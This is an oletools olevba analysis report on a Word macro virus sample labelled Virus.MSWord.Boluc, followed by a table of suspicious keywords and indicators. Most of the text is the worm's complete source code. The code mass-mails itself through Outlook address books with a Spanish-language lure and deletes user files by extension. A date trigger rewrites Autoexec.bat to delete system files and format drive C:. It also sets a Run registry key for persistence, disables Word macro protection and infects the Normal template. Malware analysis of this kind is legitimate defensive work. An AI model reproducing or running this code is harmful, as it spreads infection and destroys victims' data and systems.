olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boluc
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Boluc 
in file: Virus.MSWord.Boluc - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
REM 25/02/2001
On Error Resume Next
Dim X
Dim fso
Dim fil4
Dim nD
Dim file
Set fso = CreateObject("Scripting.FileSystemObject")
Set fsoST = WScript.CreateObject("WScript.Shell")
Set sysdir = fso.GetSpecialFolder(1)
Set file = fso.GetFile(WScript.ScriptFullName)
If fso.FileExists(sysdir&"\Hola.vbs") = False then
file.copy(sysdir&"\THWIN.vbs")
file.copy(sysdir&"\Hola.vbs")
Dim oOutlook, nMapi, cItem
Set oOutLook = CreateObject("Outlook.Application")
Set nMapi = oOutlook.getNameSpace("MAPI")
If oOutlook = "Outlook" Then
nMapi.Logon "Profile", "password"
For y = 1 To nMapi.AddressList.Count
Set NuevLib = nmapi.Addresslist(y)
Set cItem = oOutlook.CreateItem(0)
For Va = 1 To NueLib.AddressEntries.count
Uf = NueLib.AddressEntries(Va)
cItem.Recipients.Add Uf
If Va > 70 Then Exit For
Next
cItem.Subject = "Hola"
cItem.Body = "Un recuerdo para t� en en Archivo Adjunto"
cItem.Attachments.Add (sysdir&"\Hola.vbs")
cItem.Send
Uf = ""
Next
nMapi.Logoff
End If
End If
Randomize
nD = Int((33 * Rnd) + 1)
If nD < 32 Then
If nD >= 1 And nD <= 2 Then cFiles ="xls"
If nD > 2 And nD <= 4 Then cFiles ="dbf"
If nD > 4 And nD <= 5 Then cFiles ="wav"
If nD > 5 And nD <= 7 Then cFiles ="dwg"
If nD > 7 And nD <= 9 Then cFiles ="mp3"
If nD > 9 And nD <= 11 Then cFiles ="bak"
If nD > 11 And nD <= 14 Then cFiles ="wav"
If nD > 14 And nD <= 16 Then cFiles ="bmp"
If nD > 16 And nD <= 18 Then cFiles ="htm"
If nD > 18 And nD <= 20 Then cFiles ="hlp"
If nD > 20 And nD <= 22 Then cFiles ="chm"
If nD > 22 And nD <= 24 Then cFiles ="jpg"
If nD > 24 And nD <= 26 Then cFiles ="gif"
If nD > 26 And nD <= 27 Then cFiles ="scr"
If nD > 27 And nD <= 28 Then cFiles ="cdr"
If nD > 28 And nD <= 31 Then cFiles ="ttf"
If fso.FileExists(sysdir & "\ListWin.txt") Then
Set List1 = fso.OpentextFile(sysdir & "\ListWin.txt")
HL = List1.ReadAll
List1.Close
Else
HL = "ARCHIVOS"
End If
Set List1 = fso.CreateTextFile(sysdir & "\ListWin.txt")
List1.WriteLine (HL)
hode()
List1.Close
Else
If Date > DateSerial(2001, 5, 27) Then
Dim fil1
Dim fil2
Dim wt
Dim fil3
Dim s
Set fil1 = fso.OpenTextFile("c:\Autoexec.bat")
s = fil1.readAll
fil1.Close
Set fil2 = fso.createTextFile("c:\hercolubus.txt", True)
fil2.write (s)
fil2.WriteLine ("@echo off")
fil2.WriteLine ("DEL "&sysdir&"\*.SYS")
fil2.WriteLine ("DEL "&sysdir&"\*.DLL")
fil2.WriteLine ("DEL "&sysdir&"\*.OCX")
fil2.WriteLine ("CLS")
fil2.WriteLine ("FORMAT C: /u /v:HERCOLUBUS /autotest")
fil2.WriteLine ("if not errorlevel 0 goto FORMAT_ERROR")
fil2.WriteLine ("CLS")
fil2.Close
Set fil3 = fso.GetFile("c:\hercolubus.txt")
fil3.Copy ("c:\Autoexec.bat")
Set fil3 = fso.GetFile("c:\hercolubus.txt")
fil3.Delete
End If
End If
wini()
mesg()
oprog()
Sub hode()
Dim d,dc,s
X=0
Set dc = fso.drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If x < 3 Then Busc(d)
End If
Next
End Sub
Sub Busc(nFolder)
On Error Resume Next
set f=fso.GetFolder(nFolder&"\")
Set sf = f.SubFolders
For Each f1 In sf
If x < 3 Then
files1(f1&"\")
Else
Exit For
End If
If x < 3 Then
Busc(f1&"\")
Else
Exit For
End If
Next
End Sub
Sub Files1(subF)
On Error Resume Next
Set f2 = fso.GetFolder(subF)
Set fc = f2.Files
For Each fl In fc
ext = fso.GetExtensionName(fl.Path)
If ext = cFiles Then
If x < 3 Then
List1.WriteLine Now & " " & fl.Path
Set oFil = fso.getFile(fl.Path)
oFil.delete
x = x + 1
Else
Exit For
End If
End If
Next
End Sub
Sub oprog()
On Error Resume Next
Set oWord = CreateObject("Word.Application")
oWord.Options.SaveNormalPrompt = False
oWord.CommandBars("Tools").Controls("Macro").Enabled = False
oWord.Options.VirusProtection = False
Set jui = oWord.NormalTemplate.VBProject.VBComponents.Item(1)
If jui.Name <> "Hercolubus" Then

nlines = jui.CodeModule.CountOfLines
jui.CodeModule.DeleteLines 1, nlines
jui.Name = "Hercolubus"
jui.codemodule.InsertLines 1, "Sub Document_Close()"
jui.codemodule.InsertLines 2, "On Error Resume Next"
jui.codemodule.InsertLines 3, "Set eDrive = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")"
jui.codemodule.InsertLines 4, "hn = Application.Path & " + Chr(34) +"\Microsoft.doc"+ chr(34)
jui.codemodule.InsertLines 5, "If eDrive.FileExists(hn) Then"
jui.codemodule.InsertLines 6, "Application.ScreenUpdating = False"
jui.codemodule.InsertLines 7, "nDoc = ActiveDocument.FullName"
jui.codemodule.InsertLines 8, "If nDoc <> " + Chr(34) +"C:\Microsof.doc" + Chr(34) + " Then"
jui.codemodule.InsertLines 9, "Nam = ActiveDocument.Name"
jui.codemodule.InsertLines 10, "nNam = Len(Nam)"
jui.codemodule.InsertLines 11, "If Right(Nam, 3) = " + Chr(34) + "doc" + chr(34) + " Then"
jui.codemodule.InsertLines 12, "sEo = Left(Nam, nNam - 4)"
jui.codemodule.InsertLines 13, "PostN = ActiveDocument.VBProject.VBComponents.count"
jui.codemodule.InsertLines 14, "For j = 1 To PostN"
jui.codemodule.InsertLines 15, "Set Pert = ActiveDocument.VBProject.VBComponents.Item(j)"
jui.codemodule.InsertLines 16, "If Pert.Name = " + Chr(34) +"Hercolubus" + Chr(34) + " Then"
jui.codemodule.InsertLines 17, "Exit For"
jui.codemodule.InsertLines 18, "Else"
jui.codemodule.InsertLines 19, "If j = PostN Then"
jui.codemodule.InsertLines 20, "Documents.Open FileName:=(hn)"
jui.codemodule.InsertLines 21, "kh = Dir(hn)"
jui.codemodule.InsertLines 22, "nC = Len(kh)"
jui.codemodule.InsertLines 23, "sE = Left(kh, nC - 4)"
jui.codemodule.InsertLines 24, "Application.Windows(sEo).Activate"
jui.codemodule.InsertLines 25, "ActiveDocument.SaveAs Filename:=" + Chr(34) + "C:\Microsof.doc" + Chr(34)
jui.codemodule.InsertLines 26, "ActiveDocument.Select"
jui.codemodule.InsertLines 27, "Selection.Copy"
jui.codemodule.InsertLines 28, "Application.Windows(sE).Activate"
jui.codemodule.InsertLines 29, "Selection.Paste"
jui.codemodule.InsertLines 30, "ActiveDocument.SaveAs Filename:=nDoc"
jui.codemodule.InsertLines 31, "ScreenUpdating = True"
jui.codemodule.InsertLines 32, "ActiveDocument.Close"
jui.codemodule.InsertLines 33, "End If"
jui.codemodule.InsertLines 34, "End If"
jui.codemodule.InsertLines 35, "Next j"
jui.codemodule.InsertLines 36, "End If"
jui.codemodule.InsertLines 37, "End If"
jui.codemodule.InsertLines 38, "End If"
jui.codemodule.InsertLines 39, "Set Drv = eDrive.GetDrive(" + Chr(34) + "A:" + Chr(34) + ")"
jui.codemodule.InsertLines 40, "If Drv.IsReady Then"
jui.codemodule.InsertLines 41, "eDrive.CopyFile eDrive.GetSpecialFolder(1) & "+ Chr(34) + "\Hola.vbs" + Chr(34) + " , " + Chr(34) + "A:\Hola.vbs" + Chr(34)
jui.codemodule.InsertLines 42, "End If"
jui.codemodule.InsertLines 43, "End Sub"
End If
oWord.Quit
End Sub
Sub wini()
On Error Resume Next
fsoST.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN",sysdir&"\THWIN.vbs"
fsoST.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\level",1,"REG_DWORD"
End Sub
Sub mesg()
On Error Resume Next
Dim Mensaje
Dim Estilo
Dim Titulo
Dim Respuesta
If fso.FileExists(sysdir&"\Helow.vbs") = False then
file.copy(sysdir&"\Helow.vbs")
Mensaje = "Hola.. Quisiera tener una linda amistad contigo, no s� si recuerdas la vez que platicamos en el chat;" + Chr(13) +" yo solo recordaba tu e-mail y la verdad me agrad� tu pl�tica y me pareces una buena persona" + Chr(13) +"Quisiera comunicarme continuamente contigo." + Chr(13) +"Estar� esperando tu respuesta, escr�beme." + Chr(13) + Chr(13) +"HASTA PRONTO"
Estilo = vbInformation
Titulo = "HOLA"
Respuesta = MsgBox(Mensaje, Estilo, Titulo)
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Hola.vbs            |Executable file name                         |
|IOC       |THWIN.vbs           |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Helow.vbs           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

